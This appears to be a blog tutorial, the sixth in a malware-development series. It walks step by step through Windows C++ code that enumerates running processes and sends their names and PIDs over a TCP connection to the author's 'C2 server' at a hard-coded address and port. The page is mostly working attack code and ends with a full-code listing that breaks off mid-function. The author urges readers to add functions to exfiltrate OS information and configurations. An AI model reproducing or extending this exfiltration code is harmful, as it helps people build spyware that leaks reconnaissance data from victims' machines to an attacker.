# https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-06/

<!DOCTYPE html><!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
--><html lang="en" class=" js "><body class="layout--single wide"><a href="https://buymeacoffee.com/ry0d4n" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;"></a>


  

  
    

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  



  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
    
    
    
    

    <div class="page__inner-wrap">
      
        
      

      <section class="page__content" itemprop="text">
        
          
        
        <p>In this article I am going to be exploring data exfiltration techniques, specifically we are going to obtain the processes running on the target system and send them to our C2 server.</p>

<h1 id="process-enumeration">Process Enumeration<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-06/#process-enumeration" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>First we can start by writing the function that’ll enumerate all the processes and send each process name and ID, over the connection channel that we are going to initiate.</p>

<p>This time we are going to use <code class="language-plaintext highlighter-rouge">EnumProcesses</code> API:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">EnumProcesses</span><span class="p">(</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">DWORD</span>   <span class="o">*</span><span class="n">lpidProcess</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">DWORD</span>   <span class="n">cb</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">LPDWORD</span> <span class="n">lpcbNeeded</span>
<span class="p">);</span>
</code></pre></div></div>
<p>This function retrieves the process identifier (PID) for each process object in the system. Then we can use APIs like <code class="language-plaintext highlighter-rouge">GetModuleBaseName</code> and <code class="language-plaintext highlighter-rouge">OpenProcess</code> to get the actual process name.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">DWORD</span> <span class="n">dwPsses</span><span class="p">[</span><span class="mi">2046</span><span class="p">],</span> <span class="n">dwPids</span><span class="p">,</span> <span class="n">dwRl1</span><span class="p">,</span> <span class="n">dwRl2</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">EnumProcesses</span><span class="p">(</span><span class="n">dwPsses</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dwPsses</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRl1</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"EnumProcesses failed with error: %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>After this call <code class="language-plaintext highlighter-rouge">dwPsses</code> will receives the list of process identifiers.</p>

<p>Next we can calculate the exact number of PIDs returned (I.e processes), we can divide the dwRl1 by the size of a DWORD.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dwPids</span> <span class="o">=</span> <span class="n">dwRl1</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">);</span>
</code></pre></div></div>

<p>As we are expecting to send the process list and number of them over a connection, we must pass a connection socket as a parameter so we can use that socket to send our data.</p>

<p>And now we have the number of processes, we can send it over the socket:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">snprintf</span><span class="p">(</span><span class="n">sendbuf</span><span class="p">,</span> <span class="n">DEFAULT_BUFLEN</span><span class="p">,</span> <span class="s">"Number of processes = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dwPids</span><span class="p">);</span>

<span class="n">iResult</span> <span class="o">=</span> <span class="n">send</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">,</span> <span class="n">sendbuf</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">sendbuf</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div></div>

<blockquote>
  <p><em>ConnectSocket</em> will be passed as a parameter</p>
</blockquote>

<p>Next in order to resolve each processes’ name we need to loop on each element (PID) of the array:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwPids</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">dwPsses</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">((</span><span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">dwPsses</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">EnumProcessModules</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hModule</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">HMODULE</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRl2</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">==</span> <span class="n">ERROR_PARTIAL_COPY</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">printf</span><span class="p">(</span><span class="s">"EnumProcessModule failed with ERROR_PARTIAL_COPY, skipping process %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dwPsses</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                        <span class="k">continue</span><span class="p">;</span> 
                    <span class="p">}</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"EnumProcessModule failed with error %d, PID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">(),</span> <span class="n">dwPsses</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">GetModuleBaseName</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">wcProc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">wcProc</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">)))</span> <span class="p">{</span>
                        <span class="n">printf</span><span class="p">(</span><span class="s">"GetModuleBaseName failed with error %d, PID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">(),</span> <span class="n">dwPsses</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">else</span> <span class="p">{</span>
                        <span class="n">snprintf</span><span class="p">(</span><span class="n">sendbuf</span><span class="p">,</span> <span class="n">DEFAULT_BUFLEN</span><span class="p">,</span> <span class="s">"[+] Process %ls, With PID %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">wcProc</span><span class="p">,</span> <span class="n">dwPsses</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                        <span class="n">iResult</span> <span class="o">=</span> <span class="n">send</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">,</span> <span class="n">sendbuf</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">sendbuf</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">iResult</span> <span class="o">==</span> <span class="n">SOCKET_ERROR</span><span class="p">)</span> <span class="p">{</span>
                            <span class="n">printf</span><span class="p">(</span><span class="s">"send failed with error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">WSAGetLastError</span><span class="p">());</span>
                            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>Here <code class="language-plaintext highlighter-rouge">OpenProcess</code> is used to get a handle to the process, the first arguments are the flags</p>

<ul>
  <li>
    <p><strong>PROCESS_QUERY_INFORMATION</strong>: It is required to retrieve certain information about a process, such as its token, exit code, name, and priority.</p>
  </li>
  <li>
    <p><strong>PROCESS_VM_READ</strong>: It is required to read memory in a process using.</p>
  </li>
</ul>

<blockquote>
  <p>There are other flags like <strong>PROCESS_ALL_ACCESS</strong> that provide more access than the flags used above, but since we just want to get the names for now we can stick to them</p>
</blockquote>

<p>After the call to OpenProcess the variable hProcess will be the handle to the process that was opened, next we pass that handle to <code class="language-plaintext highlighter-rouge">EnumProcessModules</code>:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">EnumProcessModules</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">HANDLE</span>  <span class="n">hProcess</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">HMODULE</span> <span class="o">*</span><span class="n">lphModule</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">DWORD</span>   <span class="n">cb</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">LPDWORD</span> <span class="n">lpcbNeeded</span>
<span class="p">);</span>
</code></pre></div></div>
<p>This API retrieves a handle for each module in the specified process, after we obtain a handle to that module, we can use <code class="language-plaintext highlighter-rouge">GetModuleBaseName</code> to obtain the name of the process.</p>

<blockquote>
  <p>Note: If <code class="language-plaintext highlighter-rouge">EnumProcessModules</code> is called from a 32-bit application running on WOW64, it can only enumerate the modules of a 32-bit process. If the process is a 64-bit process, this function fails and the last error code is <strong>ERROR_PARTIAL_COPY</strong>.</p>
</blockquote>

<p><code class="language-plaintext highlighter-rouge">GetModuleBaseName</code> will return the process name in <code class="language-plaintext highlighter-rouge">wcProc</code> and then at the end of the loop, we send the name over the connection channel.</p>

<p>Now this is just one function to send process information, I highly encourage you to write more functions to exfiltrate data like, OS information, configurations, etc.</p>

<h1 id="initializing-the-connection">Initializing the connection<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-06/#initializing-the-connection" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>We will be using <code class="language-plaintext highlighter-rouge">WSAStartup</code> to initialize our connection, but first start a listener on your serve on any port.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">WSAStartup</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">WORD</span>      <span class="n">wVersionRequired</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">LPWSADATA</span> <span class="n">lpWSAData</span>
<span class="p">);</span>
</code></pre></div></div>
<p>This function is part of the Windows Sockets API (Winsock), which is an interface that manages input/output requests for Internet applications in a Windows operating system.</p>

<p>It initializes the Winsock library, allowing a Windows Sockets application to use the Winsock API. It must be the first Winsock function called by an application.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">WSADATA</span> <span class="n">wsaData</span><span class="p">;</span>
 <span class="n">SOCKET</span> <span class="n">ConnectSocket</span> <span class="o">=</span> <span class="n">INVALID_SOCKET</span><span class="p">;</span>
 <span class="k">struct</span> <span class="nc">addrinfo</span><span class="o">*</span> <span class="n">result</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">*</span> <span class="n">ptr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
 <span class="k">struct</span> <span class="nc">addrinfo</span> <span class="n">hints</span><span class="p">;</span>
 <span class="kt">int</span> <span class="n">iResult</span><span class="p">;</span>

 <span class="c1">// Initialize Winsock</span>
 <span class="n">iResult</span> <span class="o">=</span> <span class="n">WSAStartup</span><span class="p">(</span><span class="n">MAKEWORD</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">wsaData</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="n">iResult</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"WSAStartup failed with error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">iResult</span><span class="p">);</span>
     <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hints</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">hints</span><span class="p">));</span>
 <span class="n">hints</span><span class="p">.</span><span class="n">ai_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span><span class="p">;</span>
 <span class="n">hints</span><span class="p">.</span><span class="n">ai_socktype</span> <span class="o">=</span> <span class="n">SOCK_STREAM</span><span class="p">;</span>
 <span class="n">hints</span><span class="p">.</span><span class="n">ai_protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
</code></pre></div></div>
<p>The <code class="language-plaintext highlighter-rouge">hints</code> variable is likely of type <code class="language-plaintext highlighter-rouge">addrinfo</code>, which is a structure used for specifying criteria for socket address structures returned by <code class="language-plaintext highlighter-rouge">getaddrinfo()</code> function.</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">hints.ai_family = AF_UNSPEC;</code>: This line sets the address family to unspecified. In practice, this means that the <code class="language-plaintext highlighter-rouge">getaddrinfo()</code> function will return address information for either IPv4 or IPv6, whichever is available.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">hints.ai_socktype = SOCK_STREAM;</code>: This line sets the socket type to stream-oriented (TCP).</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">hints.ai_protocol = IPPROTO_TCP;</code>: This line sets the protocol to TCP. This is an additional hint for the <code class="language-plaintext highlighter-rouge">getaddrinfo()</code> function, indicating that it should return addresses that support TCP communication.</p>
  </li>
</ul>

<p><code class="language-plaintext highlighter-rouge">ZeroMemory()</code> is used to zero out the memory occupied by the <code class="language-plaintext highlighter-rouge">hints</code> structure. It sets all bytes of the structure to zero. This ensures that there are no residual values in the structure, making it ready for use.</p>

<p>Next we call <code class="language-plaintext highlighter-rouge">getaddrinfo</code> and is used to convert human-readable addresses and service names into a format that can be used by network sockets.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">iResult</span> <span class="o">=</span> <span class="n">getaddrinfo</span><span class="p">(</span><span class="n">SERVER_IP</span><span class="p">,</span> <span class="n">DEFAULT_PORT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hints</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">result</span><span class="p">);</span>

</code></pre></div></div>

<p>Note that <strong>SERVER_IP</strong> and <strong>DEFAULT_PORT</strong> are defined at the start of the code.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define DEFAULT_PORT "4444"
#define DEFAULT_BUFLEN 512
#define SERVER_IP "10.0.0.5"
</span></code></pre></div></div>

<p>Now we are going to initialize a loop to iterate over the linked list of <code class="language-plaintext highlighter-rouge">addrinfo</code> structures returned by the <code class="language-plaintext highlighter-rouge">getaddrinfo()</code> function, then try to establish a connection:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
    <span class="k">for</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span> <span class="n">ptr</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">ai_next</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Create a SOCKET for connecting to server</span>
        <span class="n">ConnectSocket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">ai_family</span><span class="p">,</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">ai_socktype</span><span class="p">,</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">ai_protocol</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ConnectSocket</span> <span class="o">==</span> <span class="n">INVALID_SOCKET</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"socket failed with error: %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">WSAGetLastError</span><span class="p">());</span>
            <span class="n">WSACleanup</span><span class="p">();</span>
            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// Connect to server</span>
        <span class="n">iResult</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">,</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">ai_addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">ai_addrlen</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">iResult</span> <span class="o">==</span> <span class="n">SOCKET_ERROR</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">closesocket</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">);</span>
            <span class="n">ConnectSocket</span> <span class="o">=</span> <span class="n">INVALID_SOCKET</span><span class="p">;</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>The loop initializes <code class="language-plaintext highlighter-rouge">ptr</code> with the address of the first <code class="language-plaintext highlighter-rouge">addrinfo</code> structure in the linked list <code class="language-plaintext highlighter-rouge">result</code>. It iterates as long as <code class="language-plaintext highlighter-rouge">ptr</code> is not <code class="language-plaintext highlighter-rouge">NULL</code>, meaning there are still more <code class="language-plaintext highlighter-rouge">addrinfo</code> structures in the list. After each iteration, it moves <code class="language-plaintext highlighter-rouge">ptr</code> to point to the next <code class="language-plaintext highlighter-rouge">addrinfo</code> structure in the list <code class="language-plaintext highlighter-rouge">ptr = ptr-&gt;ai_next</code>.</p>

<p>The <code class="language-plaintext highlighter-rouge">socket</code> creates an endpoint for communication between two machines over a network and then <code class="language-plaintext highlighter-rouge">connect</code> will establish a connection to the second machine using the socket.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SOCKET</span> <span class="nf">socket</span><span class="p">(</span>
    <span class="kt">int</span> <span class="n">af</span><span class="p">,</span>
    <span class="kt">int</span> <span class="n">type</span><span class="p">,</span>
    <span class="kt">int</span> <span class="n">protocol</span>
<span class="p">);</span>

<span class="kt">int</span> <span class="nf">connect</span><span class="p">(</span>
    <span class="n">SOCKET</span>         <span class="n">s</span><span class="p">,</span>
    <span class="k">const</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span>
    <span class="kt">int</span>            <span class="n">namelen</span>
<span class="p">);</span>

</code></pre></div></div>
<p>The loop will break once a successful connection is established.</p>

<p>After the loop we simple free the memory allocated by <code class="language-plaintext highlighter-rouge">getaddrinfo</code></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">freeaddrinfo</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
</code></pre></div></div>

<p>Now after we have established the connection we can pass the socket to our process enumeration function we did before:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SendProcessesInfo</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">))</span> <span class="p">{</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to send processes information.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 <span class="p">}</span>

 <span class="c1">// Shutdown the connection since no more data will be sent</span>
 <span class="n">iResult</span> <span class="o">=</span> <span class="n">shutdown</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">,</span> <span class="n">SD_SEND</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="n">iResult</span> <span class="o">==</span> <span class="n">SOCKET_ERROR</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"shutdown failed with error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">WSAGetLastError</span><span class="p">());</span>
     <span class="n">closesocket</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">);</span>
     <span class="n">WSACleanup</span><span class="p">();</span>
     <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="c1">// cleanup</span>
 <span class="n">closesocket</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">);</span>
 <span class="n">WSACleanup</span><span class="p">();</span>
</code></pre></div></div>

<p>At the end a simple cleanup must be done to shutdown the socket and close the connection since we’ve done sending the data.</p>

<h1 id="execution" class="active">Execution<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-06/#execution" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>Start a listener on your host machine.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/6-0.png" alt="P1"></p>

<p>Run the application and if everything is OKAY you should get the data.
<img src="https://ry0dan.github.io/assets/images/malware-development/6-1.png" alt="P2"></p>

<p>Thanks for reading, and here is the full code:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define WIN32_LEAN_AND_MEAN
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;winsock2.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;ws2tcpip.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"Psapi.h"</span><span class="cp">
</span>
<span class="cp">#pragma comment(lib, "Ws2_32.lib")
</span>
<span class="cp">#define DEFAULT_PORT "4444"
#define DEFAULT_BUFLEN 512
#define SERVER_IP "10.0.0.5"
</span>
<span class="n">BOOL</span> <span class="nf">SendProcessesInfo</span><span class="p">(</span><span class="n">SOCKET</span> <span class="n">ConnectSocket</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">HMODULE</span> <span class="n">hModule</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">WCHAR</span> <span class="n">wcProc</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
    <span class="n">DWORD</span> <span class="n">dwPsses</span><span class="p">[</span><span class="mi">2046</span><span class="p">],</span> <span class="n">dwPids</span><span class="p">,</span> <span class="n">dwRl1</span><span class="p">,</span> <span class="n">dwRl2</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">EnumProcesses</span><span class="p">(</span><span class="n">dwPsses</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dwPsses</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRl1</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"EnumProcesses failed with error: %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">dwPids</span> <span class="o">=</span> <span class="n">dwRl1</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">);</span>

    <span class="kt">char</span> <span class="n">sendbuf</span><span class="p">[</span><span class="n">DEFAULT_BUFLEN</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">iResult</span><span class="p">;</span>

    <span class="n">snprintf</span><span class="p">(</span><span class="n">sendbuf</span><span class="p">,</span> <span class="n">DEFAULT_BUFLEN</span><span class="p">,</span> <span class="s">"Number of processes = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dwPids</span><span class="p">);</span>
    <span class="n">iResult</span> <span class="o">=</span> <span class="n">send</span><span class="p">(</span><span class="n">ConnectSocket</span><span class="p">,</span> <span class="n">sendbuf</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">sendbuf</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iResult</span> <span class="o">==</span> <span class="n">SOCKET_ERROR</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"send failed with error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">WSAGetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwPids</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">dwPsses</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">((</span><span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">dwPsses</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">EnumProcessModules</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hModule</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">HMODULE</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRl2</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">==</span> <span class="n">ERROR_PARTIAL_COPY</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">printf</span><span class="p">(</span><span class="s">"EnumProcessModule failed with ERROR_PARTIAL_COPY, skipping process %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dwPsses</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                        <span class="k">continue</span><span class="p">;</span> 
                    <span class="p">}</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"EnumProcessModule failed with error %d, PID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">(),</span> <span class="n">dwPsses</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span>
